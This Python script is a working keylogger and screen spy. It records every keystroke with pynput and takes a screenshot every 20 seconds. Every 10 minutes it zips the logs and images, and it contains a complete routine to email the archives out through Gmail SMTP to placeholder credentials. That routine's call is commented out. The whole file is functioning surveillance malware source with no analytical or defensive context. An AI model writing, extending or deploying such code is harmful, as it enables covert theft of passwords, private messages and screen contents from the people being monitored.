import pynput.keyboard
import threading
import pyautogui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import zipfile
import os

log = open("Logs\\log.txt", "w")

image_counter = 1
zip_counter = 1

def callback_function(key):
    try:
        log.write(key.char)
        log.flush()
        
    except AttributeError:
        if key == key.space:
            tus = " "
        elif key == key.enter:
            tus = "\n[ENTER]\n"
        elif key == key.backspace:
            tus="\n[BACKSPACE]"
        elif key == key.tab:
            tus="\n[TAB]"
        elif key == key.caps_lock:
            tus="\n[CAPSLOCK]"
        elif key == key.shift or key == key.shift_r:
            tus="\n[SHIFT]"
        elif key == key.ctrl_l or key == key.ctrl_r:
            tus="\n[CTRL]"
        elif key == key.esc:
            tus="\n[ESC]" 
        elif key == key.right:
            tus = "\n[RIGHT]"
        elif key == key.left:
            tus = "\n[LEFT]"
        elif key == key.up:
            tus = "\n[UP]"
        elif key == key.down:
            tus = "\n[DOWN]"
        elif key == key.cmd:
            tus = "\n[CMD]"
        elif key == key.delete:
            tus = "\n[DELETE]"
        elif key == key.alt_l or key == key.alt_r:
            tus = "\n[ALT]"
        else:
            tus = str(key)
        log.write(tus)
        log.flush()

def send_email(message):
        
    sender_email = "yourmail@example.com"
    sender_password = "yourpassword"

    receiver_email = "yourmail@example.com"

    subject = "Rar Dosyası"

    rar_file = message

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    msg.attach(MIMEText("New Log", 'plain'))

    attachment = open(rar_file, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % rar_file)
    msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587) 
        server.starttls()
        server.login(sender_email, sender_password)
        text = msg.as_string()
        server.sendmail(sender_email, receiver_email, text)
        server.quit()
    except Exception as e:
        print("E-posta gönderme hatası:", str(e))

def thread_function():
    global zip_counter
    folders=["..\\..\\..\\Images","..\\..\\..\\Logs"]
    zip_name=f"..\\..\\..\\Rar Files\\Log{zip_counter}.zip"
    zip_counter +=1
    convert_zip(folders,zip_name)
    # send_email(zip_name)
    timer_object = threading.Timer(600,thread_function)
    timer_object.start()

def take_screenshot():
    global image_counter
    ekran=pyautogui.screenshot()
    ekran.save(f"..\\..\\..\\Images\\ekran{image_counter}.jpg")
    image_counter += 1
    timer_object = threading.Timer(20,take_screenshot)
    timer_object.start()

    
def convert_zip(kaynak_dosyalar, hedef_zip):
    with zipfile.ZipFile(hedef_zip, 'w', zipfile.ZIP_DEFLATED) as zipdosyasi:
        for kaynak_dosya in kaynak_dosyalar:
            for root, dirs, files in os.walk(kaynak_dosya):
                for file in files:
                    file_path = os.path.join(root, file)
                    zip_path = os.path.relpath(file_path, kaynak_dosya)
                    zipdosyasi.write(file_path, zip_path)

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    take_screenshot()
    thread_function()
    keylogger_listener.join()

log.close()
    

